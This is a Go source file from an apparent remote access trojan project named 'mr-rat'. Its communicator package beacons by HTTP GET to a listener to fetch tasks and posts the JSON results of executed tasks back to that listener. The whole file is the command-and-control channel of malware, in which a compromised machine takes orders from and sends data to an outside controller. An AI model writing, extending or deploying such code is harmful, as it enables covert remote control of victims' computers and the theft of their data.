package communicator

import (
	"encoding/json"
	"fmt"
	"github.com/mauricetjmurphy/mr-rat/pkg/httpclient"
	"github.com/mauricetjmurphy/mr-rat/pkg/tasks"
	"io"
	"log"

	"net/http"
)

// Communicate sends a beacon to the listener and receives tasks
func Communicate(host, port, uri string) ([]byte, error) {
	url := fmt.Sprintf("%s:%s%s", host, port, uri)
	log.Printf("Communicating with URL: %s\n", url)

	// Send the request via HTTP GET
	response, err := httpclient.Get(url)
	if err != nil {
		return nil, err
	}

	// Check HTTP status code
	if response.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(response.Body)
		return nil, fmt.Errorf("HTTP %d: %s", response.StatusCode, string(body))
	}

	defer response.Body.Close()
	responseBody, err := io.ReadAll(response.Body)
	if err != nil {
		return nil, err
	}

	return responseBody, nil
}

// SendResult sends the result of a task execution back to the listener
func SendResult(host, port, uri string, payload tasks.ResultPayload) (string, error) {
	url := fmt.Sprintf("%s:%s%s", host, port, uri)
	log.Printf("Sending result to URL: %s\n", url)

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	response, err := httpclient.Post(url, jsonData)
	if err != nil {
		return "", err
	}

	// Check HTTP status code
	if response.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(response.Body)
		return "", fmt.Errorf("HTTP %d: %s", response.StatusCode, string(body))
	}

	defer response.Body.Close()
	responseBody, err := io.ReadAll(response.Body)
	if err != nil {
		return "", err
	}

	return string(responseBody), nil
}
